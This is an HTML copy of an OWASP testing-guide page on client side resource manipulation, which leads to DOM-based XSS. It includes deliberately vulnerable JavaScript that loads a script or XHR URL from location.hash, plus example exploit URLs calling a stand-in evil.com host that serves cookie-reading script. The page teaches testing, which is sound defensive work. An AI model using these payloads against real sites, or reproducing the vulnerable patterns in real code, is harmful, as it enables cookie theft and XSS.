<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>4.12.6 Testing for Client Side Resource Manipulation (OTG-CLIENT-006)  </title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">4.12.6 Testing for Client Side Resource Manipulation (OTG-CLIENT-006)  </h1><br/><br /><h2>Summary</h2><br />A Client Side Resource Manipulation vulnerability is an input  validation flaw that occurs when an application accepts an user  controlled input which specifies the path of a resource (for example the  source of an iframe, js, applet or the handler of an XMLHttpRequest).  Specifically, such a vulnerability consists in the ability to control  the URLs which link to some resources present in a web page. The impact  may vary on the basis of the type of the element whose URL is controlled  by the attacker, and it is usually adopted to conduct Cross-Site  Scripting attacks. <br /><br /><h2>How to Test</h2><br />Such a vulnerability occurs when the application employs user  controlled URLs for referencing external/internal resources. In these  circumstances it is possible to interfere with the expected  application's behavior in the sense of making it load and render  malicious objects.  <br /><br /> The following JavaScript code shows a possible vulnerable script in  which the attacker is able to control the "location.hash" (source) which  reaches the attribute "src" of a script element. This particular  obviously leads XSS since an external JavaScript could be easily  injected in the trusted web site. <br />&lt;script&gt; <br />  var d=document.createElement("script"); <br />  if(location.hash.slice(1)) <br />     d.src = location.hash.slice(1); <br />  document.body.appendChild(d); <br />&lt;/script&gt;<br /><br /> Specifically the attacker could target the victim by asking her to visit the following URL:  <br />www.victim.com/#<a href="http://evil.com/js.js">http://evil.com/js.js</a><br /><br /> Where js.js contains: <br />alert(document.cookie)<br /><br /> Controlling scripts' sources is a basic example, since some other  interesting and more subtle cases can take place. A widespread scenario  involves the possibility to control the URL called in a CORS request;  since CORS allows the target resource to be accessible by the requesting  domain through a header based approach, then the attacker may ask the  target page to load malicious content loaded on its own web site.  <br /><br /> Refer to the following vulnerable code: <br />&lt;b id="p"&gt;&lt;/b&gt; <br />&lt;script&gt; <br /> function createCORSRequest(method, url) { <br />  var xhr = new XMLHttpRequest(); <br />  xhr.open(method, url, true); <br />  xhr.onreadystatechange = function () { <br />   if (this.status == 200 &amp;&amp; this.readyState == 4) { <br />     document.getElementById('p').innerHTML = this.responseText; <br />   } <br />  }; <br />  return xhr; <br /> } <br /><br /> var xhr = createCORSRequest('GET', location.hash.slice(1)); <br /> xhr.send(null); <br />&lt;/script&gt;<br /><br /> The “location.hash” is controlled by the attacker and it is used for  requesting an external resource, which will be reflected through the  construct “innerHTML”. Basically the attacker could ask the victim to  visit the following URL and at the same time he could craft the payload  handler. <br /><br /> Exploit URL: www.victim.com/#<a href="http://evil.com/html.html">http://evil.com/html.html</a> <br />http://evil.com/html.html<br />----<br />&lt;?php <br />header('Access-Control-Allow-Origin: http://www.victim.com'); <br />?&gt;<br />&lt;script&gt;alert(document.cookie);&lt;/script&gt;<br /><br /> <br /><br /><h3>Black Box testing</h3><br />Black box testing for  Client Side Resource Manipulation is not  usually performed since access to the source code is always available as  it needs to be sent to the client to be executed. <br /><br /> <br /><br /><h3>Gray Box testing</h3><br /><strong>Testing for Client Side Resource Manipulation vulnerabilities:</strong><br /> To manually check for this type of vulnerability we have to identify  whether the application employs inputs without correctly validating  them; these are under the control of the user which could be able to  specify the url of some resources. Since there are many resources that  could be included into the application (for example images, video,  object, css, frames etc.),  client side scripts which handle the  associated URLs should be investigated for potential issues.  <br /><br /> The following table shows the possible injection points (sink) that should be checked: <br /><table class="table"><col/><col/><col/><tr><th> Resource Type</th><th> Tag/Method</th><th> Sink</th></tr><tr><td> Frame</td><td> iframe</td><td> src</td></tr><tr><td> Link</td><td> a</td><td> href</td></tr><tr><td> AJAX Request</td><td> xhr.open(method, [url], true);</td><td> URL</td></tr><tr><td> CSS</td><td> link</td><td> href</td></tr><tr><td> Image</td><td> img</td><td> src</td></tr><tr><td> Object</td><td> object</td><td> data</td></tr><tr><td> Script</td><td> script</td><td> src</td></tr></table><br /><br /> The most interesting ones are those that allow to an attacker to include  client side code (for example JavaScript) since it could lead to an XSS  vulnerabilities. <br /> <br /><br /> When trying to check for this kind of issues, consider that some characters are treated differently by different browsers. Moreover always consider the possibility to try absolute URLs variants as described here: <a href="http://kotowicz.net/absolute/">http://kotowicz.net/absolute/</a> <br /><br /><h2>Tools</h2><br />•  DOMinator - <a href="https://dominator.mindedsecurity.com/">https://dominator.mindedsecurity.com/</a><br /><br /><h2>References</h2><br /><strong>OWASP Resources</strong> <br />•  <a href="https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet">DOM based XSS Prevention Cheat Sheet</a><br />•  DOMXSS.com - <a href="http://www.domxss.com">http://www.domxss.com</a><br />•  DOMXSS TestCase - <a href="http://www.domxss.com/domxss/01_Basics/04_script_src.html">http://www.domxss.com/domxss/01_Basics/04_script_src.html</a><br /><br /> <strong>Whitepapers</strong> <br />•  DOM XSS Wiki - <a href="https://code.google.com/p/domxsswiki/wiki/LocationSources">https://code.google.com/p/domxsswiki/wiki/LocationSources</a><br />•  Krzysztof Kotowicz: "Local or External? Weird URL formats on the loose" - <a href="http://kotowicz.net/absolute/">http://kotowicz.net/absolute/</a><br /></div></body></html>